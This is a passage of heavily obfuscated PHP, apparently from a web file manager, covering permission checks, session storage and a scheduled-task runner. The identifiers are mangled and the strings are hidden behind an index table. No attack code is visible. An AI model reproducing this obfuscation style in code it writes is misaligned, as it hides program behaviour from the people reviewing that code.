ΗΡ“Ή) { return $νΗϊΈ; } if (!$νΗϊΈ && $ΰτάΌΊπ) { $νΗϊΈ = $this->groupAuthInfo($ΰτάΌΊπ, $²†ώΙΙΖ); } if (!$νΗϊΈ) { $ύψ£‰ή = Model($²ο–»[590])->getInfo($²†ώΙΙΖ); $τΡ‘νήΓ = explode($²ο–»[50], trim($ύψ£‰ή[$²ο–»[589]], $²ο–»[50])); $τΡ‘νήΓ = array_reverse($τΡ‘νήΓ); foreach ($τΡ‘νήΓ as $΅ΘΙφ) { if ($΅ΘΙφ == $²ο–»[231] || $΅ΘΙφ == $³ΊΨ°Χµ) { continue; } $α›”Δ = $this->groupRootAuth($΅ΘΙφ, $ΧΙΒΤ²); if (!$α›”Δ) { continue; } $νΗϊΈ = $this->groupAuthInfo($α›”Δ, $΅ΘΙφ); break; } } if (!$νΗϊΈ || $νΗϊΈ[$²ο–»[491]] <= 0) { $¤•ύΰτ = $this->authDeepCheck($ΦΒΫΖ¬€[$²ο–»[194]], $ΧΙΒΤ²); if ($¤•ύΰτ) { $νΗϊΈ = $¤•ύΰτ; } } return $νΗϊΈ; } private function userIsRoot($Θ»²ΎΆύ = false) { $―°µ‡υ =& $_SERVER[γγάψ½]; if (!$Θ»²ΎΆύ && KodUser::isRoot()) { return !0; } $ί€Λ€°α = Model($―°µ‡υ[602])->getInfo($Θ»²ΎΆύ); $ΑΞΠέ‹ = Model($―°µ‡υ[2200])->listData($ί€Λ€°α[$―°µ‡υ[2201]]); if ($ΑΞΠέ‹ && $ΑΞΠέ‹[$―°µ‡υ[580]][$―°µ‡υ[2202]] == 1) { return !0; } return !1; } private function sourceAuthInfo($«Ζφ²’ύ) { $ω«― =& $_SERVER[γγάψ½]; $ΏηΩ΅¬¬ = Model($ω«―[1439]); $‹ƒΎΏθ = $ΏηΩ΅¬¬->sourceInfo($«Ζφ²’ύ); if (!$‹ƒΎΏθ) { return !1; } $ΏηΩ΅¬¬->groupPathDisplay($‹ƒΎΏθ); $—¶δ‹χ = array($‹ƒΎΏθ); $—¶δ‹χ = $ΏηΩ΅¬¬->_listAppendPath($—¶δ‹χ); $‹ƒΎΏθ = $—¶δ‹χ[0]; $πΧ½ζώ = $‹ƒΎΏθ[$ω«―[587]]; if (isset($‹ƒΎΏθ[$ω«―[595]])) { $“¬μΑ΅Ω = explode($ω«―[8], trim($‹ƒΎΏθ[$ω«―[587]], $ω«―[8])); array_shift($“¬μΑ΅Ω); $πΧ½ζώ = $‹ƒΎΏθ[$ω«―[593]] . $ω«―[2203] . implode($ω«―[8], $“¬μΑ΅Ω); } return array($ω«―[497] => $‹ƒΎΏθ[$ω«―[32]], $ω«―[87] => KodIO::make($‹ƒΎΏθ[$ω«―[194]]), $ω«―[2204] => $πΧ½ζώ); } private function groupAuthInfo($ƒΌή΅€, $¥Δρυ) { $β›«Χη‘ =& $_SERVER[γγάψ½]; $ΣΕβ΅­© = Model($β›«Χη‘[590])->getInfo($¥Δρυ); return array($β›«Χη‘[2205] => intval($ƒΌή΅€[$β›«Χη‘[490]]), $β›«Χη‘[2188] => $ƒΌή΅€, $β›«Χη‘[2206] => LNG($β›«Χη‘[2207]), $β›«Χη‘[2197] => array($β›«Χη‘[497] => $ΣΕβ΅­©[$β›«Χη‘[32]], $β›«Χη‘[87] => KodIO::make($ΣΕβ΅­©[$β›«Χη‘[90]][$β›«Χη‘[194]]), $β›«Χη‘[2204] => $ΣΕβ΅­©[$β›«Χη‘[594]])); } protected function groupRootAuth($έίΏώΑ„, $θΚ΄σ = false) { $Σ£ξ»βΈ =& $_SERVER[γγάψ½]; $θΚ΄σ = $θΚ΄σ ? $θΚ΄σ : USER_ID; $ΆΠ³•ι = $θΚ΄σ . $Σ£ξ»βΈ[2208] . $έίΏώΑ„; static $Γ°ν‰ = array(); if (isset($Γ°ν‰[$ΆΠ³•ι])) { return $Γ°ν‰[$ΆΠ³•ι]; } $θΈμΆΩς = Model($Σ£ξ»βΈ[590])->getInfo($έίΏώΑ„); $Υύ„Σ° = $this->userGroupList($θΚ΄σ); $…Ρ…Γ = isset($Υύ„Σ°[$έίΏώΑ„]) ? $Υύ„Σ°[$έίΏώΑ„][$Σ£ξ»βΈ[490]] : !1; if ($…Ρ…Γ && Model($Σ£ξ»βΈ[576])->authCheckAction($…Ρ…Γ[$Σ£ξ»βΈ[490]], $Σ£ξ»βΈ[2014])) { $Γ°ν‰[$ΆΠ³•ι] = $…Ρ…Γ; return $…Ρ…Γ; } $ε’Έ¬χ = $this->sourceAuthSelect($θΈμΆΩς[$Σ£ξ»βΈ[90]][$Σ£ξ»βΈ[194]]); $ιΊ‘›Ρ = $ε’Έ¬χ ? $this->authMake($ε’Έ¬χ, $θΚ΄σ) : !1; $§  = $ιΊ‘›Ρ ? $ιΊ‘›Ρ[$Σ£ξ»βΈ[545]] : !1; $Γ°ν‰[$ΆΠ³•ι] = $§  ? $§  : $…Ρ…Γ; return $Γ°ν‰[$ΆΠ³•ι]; } public function authOwnerApply($“ΠβΥ) { $ξΛµυ =& $_SERVER[γγάψ½]; if (empty($“ΠβΥ[$ξΛµυ[490]]) || isset($“ΠβΥ[$ξΛµυ[2209]]) && $“ΠβΥ[$ξΛµυ[2209]]) { return $“ΠβΥ; } if (AuthModel::authCheckRoot($“ΠβΥ[$ξΛµυ[490]][$ξΛµυ[491]])) { return $“ΠβΥ; } $±χΉ‡’· = Model($ξΛµυ[1439])->parentLevelArray($“ΠβΥ[$ξΛµυ[589]]); $±χΉ‡’· = array_merge(array($“ΠβΥ[$ξΛµυ[194]]), array_reverse($±χΉ‡’·)); $ΥΗσƒθ = $this->sourceAuthSelect($±χΉ‡’·); $«‘ΰΩ§® = array(); $ά΄£θ = array(); foreach ($ΥΗσƒθ as $ωΌ²Ά½ψ => $Έτ΄¥³…) { $φξ¦”ης = $this->authFolderOwnerUser($Έτ΄¥³…); $«‘ΰΩ§®[$ωΌ²Ά½ψ] = $φξ¦”ης; $ά΄£θ = array_merge($ά΄£θ, $φξ¦”ης[$ξΛµυ[670]]); if ($φξ¦”ης[$ξΛµυ[2210]]) { break; } } if (count($ά΄£θ) == 0) { $ά΄£θ = $this->authFolderOwnerGroup($“ΠβΥ[$ξΛµυ[574]]); } $ά΄£θ = array_unique($ά΄£θ); if (AuthModel::authCheckRoot($“ΠβΥ[$ξΛµυ[490]][$ξΛµυ[491]])) { $ά΄£θ[] = USER_ID; } $“ΠβΥ[$ξΛµυ[490]][$ξΛµυ[2211]] = Model($ξΛµυ[582])->userListInfo($ά΄£θ); return $“ΠβΥ; } private function authFolderOwnerGroup($·Ά±ά¬) { $¤ΑΧ΅Συ =& $_SERVER[γγάψ½]; $½Ή”Λεμ = Model($¤ΑΧ΅Συ[2088])->where(array($¤ΑΧ΅Συ[1401] => $·Ά±ά¬))->select(); $ψ½„ήν = array(); if (!$½Ή”Λεμ) { return $ψ½„ήν; } foreach ($½Ή”Λεμ as $Ζ„¤τΠϋ) { $ηΗƒτ© = $this->authInfo($Ζ„¤τΠϋ); if (AuthModel::authCheckRoot($ηΗƒτ©[$¤ΑΧ΅Συ[490]])) { $ψ½„ήν[] = $Ζ„¤τΠϋ[$¤ΑΧ΅Συ[1793]]; } } return $ψ½„ήν; } private function authFolderOwnerUser($•ΝΛµέσ) { $–»ό =& $_SERVER[γγάψ½]; $¦Μ½€ = array(); $η½«»σΡ = !1; foreach ($•ΝΛµέσ as $Σ±³Ψ) { $£σζ = $this->authInfo($Σ±³Ψ); if ($Σ±³Ψ[$–»ό[574]] == $–»ό[231]) { $η½«»σΡ = !0; } if ($Σ±³Ψ[$–»ό[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($£σζ[$–»ό[490]])) { $¦Μ½€[] = $Σ±³Ψ[$–»ό[574]]; } } } return array($–»ό[670] => $¦Μ½€, $–»ό[2210] => $η½«»σΡ); } public function authMake($θΧϊίζο, $ϋ†ΖΟΜΝ = false) { $Ι ‚‰© =& $_SERVER[γγάψ½]; $σε¤Φ = $this->authArrayCheck($θΧϊίζο, $ϋ†ΖΟΜΝ); if ($σε¤Φ[$Ι ‚‰©[2212]]) { $σε¤Φ[$Ι ‚‰©[2212]] = $this->sourceAuthInfo($σε¤Φ[$Ι ‚‰©[2212]]); } return $σε¤Φ; } public function authArrayCheck($βμΕ™ψΛ, $•υΌΎΨΣ = false) { $—ΣΥφ¤ =& $_SERVER[γγάψ½]; if (!$βμΕ™ψΛ) { return array($—ΣΥφ¤[491] => 0, $—ΣΥφ¤[545] => !1); } $•υΌΎΨΣ = $•υΌΎΨΣ ? $•υΌΎΨΣ : USER_ID; $©’θ‚Ϋ = 0; $« ΄βΖΆ = 0; $·ίΊον = 0; $βη = 0; $»ΨδΥκΔ = 0; $’ςώµάΊ = 0; $Ι„“έαφ = 1000; $¤Η½Κτ¬ = 0; $΄¶Ξ£“’ = 0; $ΏφΩσπ› = 0; $±Ψ›Ί† = 0; $οίρΘΙ = array($—ΣΥφ¤[194] => 0); foreach ($βμΕ™ψΛ as $οίρΘΙ) { $®ΊΦ°βΎ = $this->authInfo($οίρΘΙ); if (!$®ΊΦ°βΎ) { continue; } $ν―χΐ” = $οίρΘΙ[$—ΣΥφ¤[574]]; $ΥΉ―πθμ = intval($®ΊΦ°βΎ[$—ΣΥφ¤[490]]); if ($οίρΘΙ[$—ΣΥφ¤[191]] == SourceModel::TYPE_USER && $ν―χΐ” == $•υΌΎΨΣ) { $©’θ‚Ϋ = !0; $·ίΊον = $®ΊΦ°βΎ; $« ΄βΖΆ = $ΥΉ―πθμ; } else { if ($οίρΘΙ[$—ΣΥφ¤[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ν―χΐ”, $•υΌΎΨΣ)) { $βη = !0; $”ΈΞ«ω³ = $this->groupStepToUserGroup($ν―χΐ”, $•υΌΎΨΣ); if ($”ΈΞ«ω³ < $Ι„“έαφ) { $Ι„“έαφ = $”ΈΞ«ω³; $»ΨδΥκΔ = $ΥΉ―πθμ; $’ςώµάΊ = $®ΊΦ°βΎ; $¤Η½Κτ¬ = $ν―χΐ”; } if ($”ΈΞ«ω³ == $Ι„“έαφ && $ΥΉ―πθμ >= $»ΨδΥκΔ) { $»ΨδΥκΔ = $ΥΉ―πθμ; $’ςώµάΊ = $®ΊΦ°βΎ; $¤Η½Κτ¬ = $ν―χΐ”; } } else { if ($ν―χΐ” == $—ΣΥφ¤[231]) { $΄¶Ξ£“’ = !0; $±Ψ›Ί† = $®ΊΦ°βΎ; $ΏφΩσπ› = $ΥΉ―πθμ; } } } } if ($©’θ‚Ϋ) { $ν£ΣόΈ = $« ΄βΖΆ; $®ΊΦ°βΎ = $·ίΊον; $Έ†―µ‹ = LNG($—ΣΥφ¤[2213]); } else { if ($βη) { $ν£ΣόΈ = $»ΨδΥκΔ; $®ΊΦ°βΎ = $’ςώµάΊ; $±΄ώόΊ = Model($—ΣΥφ¤[590])->getInfo($¤Η½Κτ¬); $Έ†―µ‹ = $—ΣΥφ¤[176] . $±΄ώόΊ[$—ΣΥφ¤[594]] . $—ΣΥφ¤[2214] . LNG($—ΣΥφ¤[2215]); } else { if ($΄¶Ξ£“’) { $ν£ΣόΈ = $ΏφΩσπ›; $®ΊΦ°βΎ = $±Ψ›Ί†; $Έ†―µ‹ = LNG($—ΣΥφ¤[2186]); } else { $ν£ΣόΈ = 0; $®ΊΦ°βΎ = !1; $Έ†―µ‹ = $—ΣΥφ¤[12]; } } } $¥Ξ©»ΐ„ = array($—ΣΥφ¤[2205] => intval($ν£ΣόΈ), $—ΣΥφ¤[2188] => $®ΊΦ°βΎ, $—ΣΥφ¤[2206] => $Έ†―µ‹, $—ΣΥφ¤[2197] => $οίρΘΙ[$—ΣΥφ¤[194]]); return $¥Ξ©»ΐ„; } private function groupContainUser($ π”ΨΪπ, $μΌό±ΖΜ = false) { return in_array($ π”ΨΪπ, $this->userGroupParents($μΌό±ΖΜ)); } private function groupStepToUserGroup($Ϊƒ‰Δ§», $Ιλχσ = false) { $―ΪφχΙά =& $_SERVER[γγάψ½]; $ήΜπ¶– = $this->userGroupList($Ιλχσ); $”¤°³ = 1000; $μ°φ¶€γ = $GLOBALS[$―ΪφχΙά[6]][$―ΪφχΙά[92]][$―ΪφχΙά[2101]] == 1; $ήηυςΪ = $μ°φ¶€γ ? 3 : 2; foreach ($ήΜπ¶– as $—†–ςΡ) { if ($—†–ςΡ[$―ΪφχΙά[1401]] == $Ϊƒ‰Δ§») { return 0; } $¦ΟΉΙ = explode($―ΪφχΙά[50], trim($—†–ςΡ[$―ΪφχΙά[589]], $―ΪφχΙά[50])); if ($¦ΟΉΙ[0] == $―ΪφχΙά[231] && count($¦ΟΉΙ) > $ήηυςΪ) { $Ψώ‚¨δ = array_reverse(array_slice($¦ΟΉΙ, $ήηυςΪ)); $κ’ΐ•ω = array_search($Ϊƒ‰Δ§», $Ψώ‚¨δ); if ($κ’ΐ•ω !== !1 && $κ’ΐ•ω + 1 <= $”¤°³) { $”¤°³ = $κ’ΐ•ω + 1; } } } return $”¤°³; } private function userGroupList($χψώ¥”‚ = false) { $ν•Ϊς«Ο =& $_SERVER[γγάψ½]; static $›Σ¥ΉΩΠ = array(); if (isset($›Σ¥ΉΩΠ[$χψώ¥”‚])) { return $›Σ¥ΉΩΠ[$χψώ¥”‚]; } $¶Τ£› = Model($ν•Ϊς«Ο[602])->getInfo($χψώ¥”‚); $›Σ¥ΉΩΠ[$χψώ¥”‚] = array_to_keyvalue($¶Τ£›[$ν•Ϊς«Ο[1400]], $ν•Ϊς«Ο[1401]); return $›Σ¥ΉΩΠ[$χψώ¥”‚]; } public function userGroupParents($ζ•°Η¬α) { $–τµνχ =& $_SERVER[γγάψ½]; static $Μδ·„½ = array(); $ζ•°Η¬α = $ζ•°Η¬α ? $ζ•°Η¬α : USER_ID; if (isset($Μδ·„½[$ζ•°Η¬α])) { return $Μδ·„½[$ζ•°Η¬α]; } $κτ¬κΆ† = $this->userGroupList($ζ•°Η¬α); $’ληο¨¤ = array(); $°£ν΅ = $GLOBALS[$–τµνχ[6]][$–τµνχ[92]][$–τµνχ[2101]] == 1; $«γΊµθ = $°£ν΅ ? 3 : 2; foreach ($κτ¬κΆ† as $­θ¦΅χ) { $υδΚƒΌ = array($­θ¦΅χ[$–τµνχ[1401]]); $Έ…¦¤φ‹ = explode($–τµνχ[50], trim($­θ¦΅χ[$–τµνχ[589]], $–τµνχ[50])); if ($Έ…¦¤φ‹[0] == $–τµνχ[231] && count($Έ…¦¤φ‹) > $«γΊµθ) { $²ΡΎ“΄Ϊ = array_slice($Έ…¦¤φ‹, $«γΊµθ); $υδΚƒΌ = array_merge($υδΚƒΌ, array_reverse($²ΡΎ“΄Ϊ)); } $’ληο¨¤ = array_merge($’ληο¨¤, $υδΚƒΌ); } $Μδ·„½[$ζ•°Η¬α] = array_unique($’ληο¨¤); return $Μδ·„½[$ζ•°Η¬α]; } public function authTargetInfoMake($–½υχίµ) { $Ι€φφ¬κ =& $_SERVER[γγάψ½]; $θήΝΣ™΅ = array(); $”ΚΆψΪέ = array(); foreach ($–½υχίµ as $­©ϋΛυυ) { if ($­©ϋΛυυ[$Ι€φφ¬κ[191]] == SourceModel::TYPE_USER) { $θήΝΣ™΅[] = intval($­©ϋΛυυ[$Ι€φφ¬κ[574]]); } else { if ($­©ϋΛυυ[$Ι€φφ¬κ[191]] == SourceModel::TYPE_GROUP) { $”ΚΆψΪέ[] = intval($­©ϋΛυυ[$Ι€φφ¬κ[574]]); } } } if ($θήΝΣ™΅) { $θήΝΣ™΅ = Model($Ι€φφ¬κ[582])->userListInfo($θήΝΣ™΅); } if ($”ΚΆψΪέ) { $°Γδ©δ = array($Ι€φφ¬κ[2083] => array($Ι€φφ¬κ[495], $”ΚΆψΪέ)); $”ΚΆψΪέ = Model($Ι€φφ¬κ[590])->field($Ι€φφ¬κ[2216])->where($°Γδ©δ)->select(); $”ΚΆψΪέ = array_to_keyvalue($”ΚΆψΪέ, $Ι€φφ¬κ[1401]); } return array($Ι€φφ¬κ[2217] => $θήΝΣ™΅, $Ι€φφ¬κ[2218] => $”ΚΆψΪέ); } public function authInfo($δ€ΕΫπ) { $Κπδ•Ω =& $_SERVER[γγάψ½]; if ($δ€ΕΫπ[$Κπδ•Ω[2102]]) { $‹‰ΙΈΠΩ = Model($Κπδ•Ω[576])->listData($δ€ΕΫπ[$Κπδ•Ω[2102]]); if (!$‹‰ΙΈΠΩ) { return !1; $Λ€νΛβζ = Model($Κπδ•Ω[576])->listData(); $Λ­–¦ƒ = array_filter_by_field($Λ€νΛβζ, $Κπδ•Ω[490], $Κπδ•Ω[231]); return $Λ­–¦ƒ; } $γθΗ·€Χ = array_field_key($‹‰ΙΈΠΩ, array($Κπδ•Ω[478], $Κπδ•Ω[32], $Κπδ•Ω[490], $Κπδ•Ω[2016], $Κπδ•Ω[2017])); $γθΗ·€Χ[$Κπδ•Ω[2219]] = $δ€ΕΫπ; return $γθΗ·€Χ; } else { return array($Κπδ•Ω[496] => 0, $Κπδ•Ω[1999] => $δ€ΕΫπ[$Κπδ•Ω[2165]], $Κπδ•Ω[497] => $Κπδ•Ω[12], $Κπδ•Ω[2016] => $Κπδ•Ω[2220]); } } } goto d†°ς†±Β©; f„α„™©: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $–Ω =& $_SERVER[γγάψ½]; static $’ΦεΞε™ = false; if ($’ΦεΞε™) { return $’ΦεΞε™; } $―΄ΓΤχα = $GLOBALS[$–Ω[6]][$–Ω[427]]; self::$sessionTime = $―΄ΓΤχα[$–Ω[1738]]; $ΪθωΘτΆ = isset($GLOBALS[$–Ω[1739]]) ? $GLOBALS[$–Ω[1739]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ΪθωΘτΆ)) { self::$sessionSign = Cookie::get($ΪθωΘτΆ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ΪθωΘτΆ, self::$sessionSign, self::$sessionTime); $ϊΰημρΏ = $―΄ΓΤχα[$–Ω[1740]]; $χ²ΚΠΗ„ = $―΄ΓΤχα[$ϊΰημρΏ]; $ύώ”΄¬ = $―΄ΓΤχα[$–Ω[908]]; switch ($ϊΰημρΏ) { case $–Ω[21]: self::$handle = Model($–Ω[909]); break; case $–Ω[910]: self::$handle = new CacheRedis($χ²ΚΠΗ„, $ύώ”΄¬); break; case $–Ω[911]: self::$handle = new CacheMemcached($χ²ΚΠΗ„, $ύώ”΄¬); break; case $–Ω[233]: $χ²ΚΠΗ„[$–Ω[87]] = $χ²ΚΠΗ„[$–Ω[87]] . $–Ω[1741]; self::$handle = new CacheFile($χ²ΚΠΗ„, $ύώ”΄¬); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $’ΦεΞε™ = new self(); return $’ΦεΞε™; } public static function getBySign($ΐ­ιΪ©ƒ) { $χΉΜΡ = self::$handle->get($ΐ­ιΪ©ƒ); $χΉΜΡ = unserialize($χΉΜΡ); return is_array($χΉΜΡ) ? $χΉΜΡ : array(); } public static function setBySign($Ύ”ιΘΖ, $Ο δςεΜ) { CacheLock::lock($Ύ”ιΘΖ); self::$handle->set($Ύ”ιΘΖ, serialize($Ο δςεΜ), self::$sessionTime); CacheLock::unlock($Ύ”ιΘΖ); } public static function sign($ΦΫρ±ΰΏ = false) { if ($ΦΫρ±ΰΏ) { self::$sessionSign = $ΦΫρ±ΰΏ; } self::init(); return self::$sessionSign; } public static function set($£¥ΥΜ¶φ, $Οκχτ = false) { self::init(); if (is_array($£¥ΥΜ¶φ)) { foreach ($£¥ΥΜ¶φ as $µ¬„σ€’ => $‚Λ±αΖο) { array_set_value(self::$data, $µ¬„σ€’, $‚Λ±αΖο); } } else { array_set_value(self::$data, $£¥ΥΜ¶φ, $Οκχτ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¥ήϋ€κ = false) { self::init(); if (!$¥ήϋ€κ) { return self::$data; } return array_get_value(self::$data, $¥ήϋ€κ); } public static function remove($¦ω…Ζ ) { self::init(); unset(self::$data[$¦ω…Ζ ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[γγάψ½][914])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ήΐ£Εόρ =& $_SERVER[γγάψ½]; if (self::valueGet($Ήΐ£Εόρ[825]) != $Ήΐ£Εόρ[91]) { return; } if (self::valueGet($Ήΐ£Εόρ[1742]) == $Ήΐ£Εόρ[91]) { $Ηξβ—‡μ = self::valueGet($Ήΐ£Εόρ[1743]); if (time() - $Ηξβ—‡μ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ήΐ£Εόρ[1742], $Ήΐ£Εόρ[91]); self::log($Ήΐ£Εόρ[1744] . ACTION . $Ήΐ£Εόρ[1745]); Hook::bind($Ήΐ£Εόρ[1746], $Ήΐ£Εόρ[1747]); $¥›ωητΞ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ήΐ£Εόρ[825]) != $Ήΐ£Εόρ[91]) { self::valueSet($Ήΐ£Εόρ[1742], $Ήΐ£Εόρ[231]); self::log($Ήΐ£Εόρ[1748]); die; } $›¥ΩΗ = time(); if ($›¥ΩΗ - $¥›ωητΞ >= 60) { self::valueSet(array($Ήΐ£Εόρ[1742] => $Ήΐ£Εόρ[91], $Ήΐ£Εόρ[1743] => $›¥ΩΗ)); $¥›ωητΞ = $›¥ΩΗ; } if (!file_exists(USER_SYSTEM . $Ήΐ£Εόρ[1749])) { self::valueSet(array($Ήΐ£Εόρ[1742] => $Ήΐ£Εόρ[231], $Ήΐ£Εόρ[825] => $Ήΐ£Εόρ[231])); self::log($Ήΐ£Εόρ[1750]); die; } $”¦θΔγ‘ = file_get_contents(BASIC_PATH . $Ήΐ£Εόρ[1751]); $•ΊυΑ‘χ = KOD_VERSION . $Ήΐ£Εόρ[10] . KOD_VERSION_BUILD; $θΈΐ° = match_text($”¦θΔγ‘, $Ήΐ£Εόρ[1752]) . $Ήΐ£Εόρ[10] . match_text($”¦θΔγ‘, $Ήΐ£Εόρ[1753]); if ($θΈΐ° != $•ΊυΑ‘χ) { self::restart(); self::log("\163\164\157\x70\145\x64\x2e\133\166\x65\x72\x73\x69\157\x6e\x20\x75\160\144\x61\164\145\73{$versionNow}\40\x3d\76\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $«ί–¥®δ =& $_SERVER[γγάψ½]; http_close(); $GLOBALS[$«ί–¥®δ[1754]] = 1; $_SERVER[$«ί–¥®δ[1755]] = $«ί–¥®δ[1756]; $_COOKIE = array(); $GLOBALS[$«ί–¥®δ[1757]] = 1; $GLOBALS[$«ί–¥®δ[1758]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $²›£”Φ =& $_SERVER[γγάψ½]; http_close(); self::valueSet($²›£”Φ[825], $²›£”Φ[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($²›£”Φ[1742] => $²›£”Φ[231], $²›£”Φ[825] => $²›£”Φ[91])); self::log($²›£”Φ[1759]); } public static function taskSwitch() { $β‚…φ· =& $_SERVER[γγάψ½]; $ α€Νϋμ = self::valueGet($β‚…φ·[825]) == $β‚…φ·[91] ? $β‚…φ·[231] : $β‚…φ·[91]; self::valueSet($β‚…φ·[825], $ α€Νϋμ); } public static function shutdownEvent() { $—ς§Μ =& $_SERVER[γγάψ½]; self::valueSet($—ς§Μ[1742], $—ς§Μ[231]); self::log($—ς§Μ[1760]); } public static function config($“οΧάρ, $φ±Ώό°‘) { self::valueSet($_SERVER[γγάψ½][825], $“οΧάρ); } private static function taskRunAll() { $Δήί¨ηΊ =& $_SERVER[γγάψ½]; $’°‰ΉΚ = timeFloat(); $ΥΓΚ = Model($Δήί¨ηΊ[1761])->listData(); $νό¨ΰο = count($ΥΓΚ); for ($“’¥ΟΑ„ = 0; $“’¥ΟΑ„ < $νό¨ΰο; $“’¥ΟΑ„++) { $™εχΑ¶ = $ΥΓΚ[$“’¥ΟΑ„]; if (!$™εχΑ¶[$Δήί¨ηΊ[478]] || $™εχΑ¶[$Δήί¨ηΊ[1762]] != $Δήί¨ηΊ[91]) { continue; } if (!self::taskTimeCheck($™εχΑ¶)) { continue; } self::taskRun($™εχΑ¶); } Hook::trigger($Δήί¨ηΊ[1763]); self::taskQueueRun($’°‰ΉΚ); } private static function taskQueueRun($Μ¬ύλ¶†) { $›§ Ωνά = 10; while (!0) { $ι¬Ρ…±£ = TaskQueue::run(); if ($ι¬Ρ…±£ === !1) { break; } if (timeFloat() - $Μ¬ύλ¶† >= $›§ Ωνά) { break; } } } private static function taskTimeCheck($έΑωΛί) { $¤”‘ƒΔ =& $_SERVER[γγάψ½]; $ϊΘ¨‡φη = json_decode($έΑωΛί[$¤”‘ƒΔ[207]], !0); $ΊβΊΐΕ¤ = intval($έΑωΛί[$¤”‘ƒΔ[1743]]); $ΤΩ¶δ† = strtotime($¤”‘ƒΔ[1764] . $ϊΘ¨‡φη[$¤”‘ƒΔ[1765]] . $¤”‘ƒΔ[1766]) - strtotime($¤”‘ƒΔ[1767]); $νο‘δΘ = time() - strtotime(date($¤”‘ƒΔ[1768]) . $¤”‘ƒΔ[1769]); $—ανθκ = $νο‘δΘ >= $ΤΩ¶δ† && $νο‘δΘ <= $ΤΩ¶δ† + 3600; switch ($ϊΘ¨‡φη[$¤”‘ƒΔ[33]]) { case $¤”‘ƒΔ[1770]: if (time() - $ΊβΊΐΕ¤ < 3600 * 24 * 30) { return !1; } if ($ϊΘ¨‡φη[$¤”‘ƒΔ[1770]] == date($¤”‘ƒΔ[1771]) && $—ανθκ) { return !0; } break; case $¤”‘ƒΔ[1772]: if (time() - $ΊβΊΐΕ¤ < 3600 * 24 * 7) { return !1; } $φƒ“ΝΟ = date($¤”‘ƒΔ[1773]) == 0 ? 7 : date($¤”‘ƒΔ[1773]); if ($ϊΘ¨‡φη[$¤”‘ƒΔ[1772]] == $φƒ“ΝΟ && $—ανθκ) { return !0; } break; case $¤”‘ƒΔ[1765]: if (time() - $ΊβΊΐΕ¤ < 3600 * 24) { return !1; } if ($—ανθκ) { return !0; } break; case $¤”‘ƒΔ[1774]: if (time() - $ΊβΊΐΕ¤ >= floatval($ϊΘ¨‡φη[$¤”‘ƒΔ[1774]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $—µΑη”¦ =& $_SERVER[γγάψ½]; static $µΣϋ¬–Ά = 0; $µΛ…‚εό = 300; if (!$µΣϋ¬–Ά) { $µΣϋ¬–Ά = time(); } if (time() - $µΣϋ¬–Ά < $µΛ…‚εό) { return; } $µΣϋ¬–Ά = time(); $€ηξς΅ = Model($—µΑη”¦[582])->db($—µΑη”¦[12]); if ($€ηξς΅) { $€ηξς΅->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($—µΑη”¦[1775], $—µΑη”¦[1776]); die; } } public static function taskRun($Ϊά­­™©) { $¥ζ’κΉη =& $_SERVER[γγάψ½]; self::log($¥ζ’κΉη[1777] . $Ϊά­­™©[$¥ζ’κΉη[478]] . $¥ζ’κΉη[1778] . $Ϊά­­™©[$¥ζ’κΉη[32]] . $¥ζ’κΉη[1779] . $Ϊά­­™©[$¥ζ’κΉη[1780]]); Model($¥ζ’κΉη[1761])->run($Ϊά­­™©[$¥ζ’κΉη[478]]); $έ”‹Λ = timeFloat(); $‹πψ‹τ = $¥ζ’κΉη[12]; switch ($Ϊά­­™©[$¥ζ’κΉη[33]]) { case $¥ζ’κΉη[385]: $ΈάΑ•—π = url_request($Ϊά­­™©[$¥ζ’κΉη[1780]], $¥ζ’κΉη[1514], !1, !1, !1, !1, 10); if ($ΈάΑ•—π[$¥ζ’κΉη[825]]) { $‹πψ‹τ = strlen($ΈάΑ•—π[$¥ζ’κΉη[1298]]); } break; case $¥ζ’κΉη[1781]: $‹πψ‹τ = Hook::apply($Ϊά­­™©[$¥ζ’κΉη[1780]]); default: break; } Model($¥ζ’κΉη[1782])->add(array($¥ζ’κΉη[1783] => $¥ζ’κΉη[12], $¥ζ’κΉη[1784] => $¥ζ’κΉη[231], $¥ζ’κΉη[33] => $¥ζ’κΉη[1785] . $Ϊά­­™©[$¥ζ’κΉη[478]], $¥ζ’κΉη[1786] => json_encode(array($¥ζ’κΉη[32] => $Ϊά­­™©[$¥ζ’κΉη[32]], $¥ζ’κΉη[1787] => timeFloat() - $έ”‹Λ, $¥ζ’κΉη[371] => $‹πψ‹τ)))); $ώ›€ΈΩν = $‹πψ‹τ ? $¥ζ’κΉη[1788] . $‹πψ‹τ : $¥ζ’κΉη[12]; self::log($¥ζ’κΉη[1789] . $Ϊά­­™©[$¥ζ’κΉη[478]] . $¥ζ’κΉη[178] . $ώ›€ΈΩν); return !0; } public static function valueGet($γέ γ) { $µι¤Χθ =& $_SERVER[γγάψ½]; $ΊΗ‰Ί” = $µι¤Χθ[1790]; $® Έ΄Το = Model($µι¤Χθ[511])->get($γέ γ, $ΊΗ‰Ί”); if (is_null($® Έ΄Το)) { Model($µι¤Χθ[511])->set($µι¤Χθ[825], $µι¤Χθ[91], $ΊΗ‰Ί”); Model($µι¤Χθ[511])->set($µι¤Χθ[1742], $µι¤Χθ[231], $ΊΗ‰Ί”); $® Έ΄Το = Model($µι¤Χθ[511])->get($γέ γ, $ΊΗ‰Ί”); } return 